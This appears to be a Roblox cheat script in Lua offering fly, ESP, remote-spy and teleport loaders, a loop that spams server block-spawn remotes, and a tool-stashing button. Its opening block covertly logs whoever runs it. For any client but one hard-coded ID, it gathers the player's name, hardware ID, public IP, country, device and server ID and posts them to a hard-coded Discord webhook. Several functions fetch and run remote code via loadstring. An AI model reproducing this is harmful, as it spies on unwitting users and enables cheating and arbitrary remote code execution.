if not shared.ScriptHasRun then
    shared.ScriptHasRun = true
    

if game:GetService("RbxAnalyticsService"):GetClientId() ~= "8ac4ed5d-c69e-464e-a4f8-9620daa748c8" then

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local function SafeRequest(options)
    if syn and syn.request then
        return syn.request(options)
    elseif http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif KRNL_LOADED and http then
        return http.request(options)
    end
end

function SendMessage(url, message)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = HttpService:JSONEncode(data)
    SafeRequest({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

function SendMessageEMBED(url, embed)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = HttpService:JSONEncode(data)
    SafeRequest({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end
local function detectDevice()
    if UserInputService.TouchEnabled then
        local platform = UserInputService:GetPlatform()
        if platform == Enum.Platform.IOS then
            return "iOS"
        elseif platform == Enum.Platform.Android then
            return "Android"
        else
            return "Mobile (Unknown)"
        end
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    else
        return "Unknown"
    end
end
local success, hwid = pcall(function()
    return game:GetService("RbxAnalyticsService"):GetClientId()
end)
hwid = success and hwid or "Unavailable"

local ip = game:HttpGet("https://api.ipify.org", true)
local countryInfo = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/", true))
local flag = countryInfo.flag and countryInfo.flag.emoji or ""
local country = countryInfo.country or "Unknown"

local executor = (identifyexecutor and type(identifyexecutor()) == "string") and {identifyexecutor(), ""} or {"Unknown", ""}
local device = detectDevice()
local jobId = game.JobId
local placeLink = "https://www.roblox.com/games/" .. game.PlaceId
local accAge = player.AccountAge .. " days"
local playerCount = Players.NumPlayers .. "/" .. Players.MaxPlayers

local embed = {
    ["title"] = "Player Information",
    ["description"] = "",
    ["color"] = 65280,
    ["fields"] = {
        { ["name"] = "Name", ["value"] = player.Name },
        { ["name"] = "HWID", ["value"] = hwid },
        { ["name"] = "IP", ["value"] = ip },
        { ["name"] = "Country", ["value"] = flag .. " " .. country },
        { ["name"] = "Account Age", ["value"] = accAge },
        { ["name"] = "Executor", ["value"] = executor[1] },
        { ["name"] = "Device", ["value"] = device },
        { ["name"] = "Server ID", ["value"] = jobId },
        { ["name"] = "Map Link", ["value"] = placeLink },
        { ["name"] = "Player Count", ["value"] = playerCount },
    },
    ["footer"] = {
        ["text"] = "By general"
    }
}

local url = "https://discord.com/api/webhooks/1314842182204657674/PH2qbxqUT52MknjUerWGat8iNWhaH9_jS9xrAX7tgr5WG7klxtlAy389tMvoqrr1uRcw"
SendMessageEMBED(url, embed)
end
end
function fly()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Vehicle%20Fly%20Gui'))()
end

function dex()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dex-mobile-by-Redz-25499"))()
end

function tp()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/Script-/refs/heads/main/Teleport%20GUI"))()
end

function rspy()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))()
end
function hydro()

local owner = "Hosvile"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/MC-Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
end
function esp()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/-/refs/heads/main/Esp"))()
end
function espoff()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/-/refs/heads/main/EspOff"))()
end
function lux()
_G.test2 = true 
while _G.test2 do wait(0)
game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
end
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game:GetService("CoreGui")  


local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 105, 0, -105) 
button.Position = UDim2.new(1, -105, 1, -20) 
button.Text = "GET"
button.TextSize = 8  
button.TextColor3 = Color3.fromRGB(255, 255, 255)  
button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)  
button.Parent = screenGui


button.MouseButton1Click:Connect(function()
    local LP = game:GetService("Players").LocalPlayer

-- Save tool function
local function saveTool()
    for _, v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Tool") then
            v.Parent = LP
        end
    end
end

-- Load tool function
local function loadTool()
    for _, v in pairs(LP:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = LP.Backpack
        end
    end
end

-- Check and execute
if LP.Character:FindFirstChildOfClass("Tool") then
    saveTool() -- ถ้าผู้เล่นถือเครื่องมืออยู่ จะเก็บเครื่องมือนั้น
else
    loadTool() -- ถ้าผู้เล่นไม่ได้ถือเครื่องมือ จะโหลดเครื่องมือทั้งหมดที่เก็บไว้
end
end)
end
